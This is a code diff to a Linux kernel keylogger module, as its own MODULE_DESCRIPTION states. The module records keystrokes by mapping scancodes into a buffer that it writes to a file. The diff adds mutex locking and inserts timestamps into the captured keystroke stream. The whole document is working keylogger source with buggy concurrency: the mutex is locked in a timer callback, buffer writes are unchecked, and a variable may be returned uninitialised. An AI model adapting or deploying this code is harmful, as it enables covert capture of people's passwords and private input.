@@ -30,16 +30,17 @@ struct file *outfile;
 int count = 0;
 //char* path;
 
-// character buffer constants
+// character buffer variables
 #define B_SIZE 1000
 char* char_buffer[B_SIZE];
 int pos = 0;
 int rollover = 0;
+struct mutex buffer_mutex; // used whenever the character buffer is modified
 
 // timer and timestamp variables
 static struct hrtimer ts_timer;
 static ktime_t ts_period;
-#define TS_TIMER_PERIOD 5
+#define TS_TIMER_PERIOD 15
 #define TS_SIZE 10
 char timestamp[TS_SIZE];
 
@@ -55,10 +56,11 @@ void generate_timestamp(void);
 static void initialize_timers(void);
 static enum hrtimer_restart print_timestamp(struct hrtimer * timer);
 static void remove_timers(void);
+int get_timestamp_index(char c);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
-const char *scancodes[][2] = {
+char *scancodes[][2] = {
   {"/0", "/0"}, {"/e", "/e"}, {"1", "!"}, {"2", "@"}, {"3", "#"},
   {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"},
   {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
@@ -77,7 +79,7 @@ const char *scancodes[][2] = {
   {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},
   {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
   {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
-  {"F11", "F11"}, {"F12", "F12"} };                                
+  {"F11", "F11"}, {"F12", "F12"} };                                 
 
 //Creating the output file
 struct file *createFile(const char *path) 
@@ -132,8 +134,9 @@ void scancode_to_key(char scancode)
 	if (scancodes[scancode][0] != '\0')
 	{
 		printk("%s\n", scancodes[scancode][shiftPressed]);
+		mutex_lock(&buffer_mutex);
 		char_buffer[pos] = scancodes[scancode][shiftPressed];
-		//printk("%s\n", char_buffer[pos]);
+		mutex_unlock(&buffer_mutex);
 		pos++;
 		if (pos >= B_SIZE) 
 		{
@@ -193,7 +196,7 @@ void generate_timestamp(void)
 	hr = (((total_sec / 3600) / 365) % 24) - 1;
 
 	// build timestamp string
-	sprintf(timestamp, "[%d:%d:%d]", hr, min, sec);
+	sprintf(timestamp, "[%02d:%02d:%02d]", hr, min, sec);
 	printk("Time: %s", timestamp);
 }
 
@@ -208,8 +211,36 @@ static void initialize_timers(void)
 
 static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
 {
-	// temp: print timestamp every 5 seconds
+	// adds a timestamp to the output file every 15 seconds; currently only works if hard-coded
+	mutex_lock(&buffer_mutex);
 	generate_timestamp();
+
+	char code;
+
+	code = timestamp[0];
+	char_buffer[pos] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[1];
+	char_buffer[pos+1] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[2];
+	char_buffer[pos+2] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[3];
+	char_buffer[pos+3] = scancodes[get_timestamp_index(code)][1];
+	code = timestamp[4];
+	char_buffer[pos+4] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[5];
+	char_buffer[pos+5] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[6];
+	char_buffer[pos+6] = scancodes[get_timestamp_index(code)][1];
+	code = timestamp[7];
+	char_buffer[pos+7] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[8];
+	char_buffer[pos+8] = scancodes[get_timestamp_index(code)][0];
+	code = timestamp[9];
+	char_buffer[pos+9] = scancodes[get_timestamp_index(code)][0];
+
+	pos = pos + TS_SIZE;
+
+	mutex_unlock(&buffer_mutex);
 
 	hrtimer_forward_now(timer, ts_period);
 	return HRTIMER_RESTART;
@@ -219,6 +250,55 @@ static void remove_timers(void)
 {
     hrtimer_cancel(&ts_timer);
 }
+
+int get_timestamp_index(char c)
+{
+	int index;
+	switch(c)
+	{
+		case '[':
+			index = 0x1a;
+			break;
+		case ']':
+			index = 0x1b;
+			break;
+		case ':':
+			index = 0x27;
+			break;
+		case '0':
+			index = 0x0b;
+			break;
+		case '1':
+			index = 0x02;
+			break;
+		case '2':
+			index = 0x03;
+			break;
+		case '3':
+			index = 0x04;
+			break;
+		case '4':
+			index = 0x05;
+			break;
+		case '5':
+			index = 0x06;
+			break;
+		case '6':
+			index = 0x07;
+			break;
+		case '7':
+			index = 0x08;
+			break;
+		case '8':
+			index = 0x09;
+			break;
+		case '9':
+			index = 0x0a;
+			break;
+	}
+
+	return index;
+}
   
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A kernel-based keylogger module");
@@ -226,6 +306,7 @@ MODULE_DESCRIPTION("A kernel-based keylogger module");
 int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
+	mutex_init(&buffer_mutex);
 	outfile = createFile(path);
 	generate_timestamp();
 	initialize_timers();
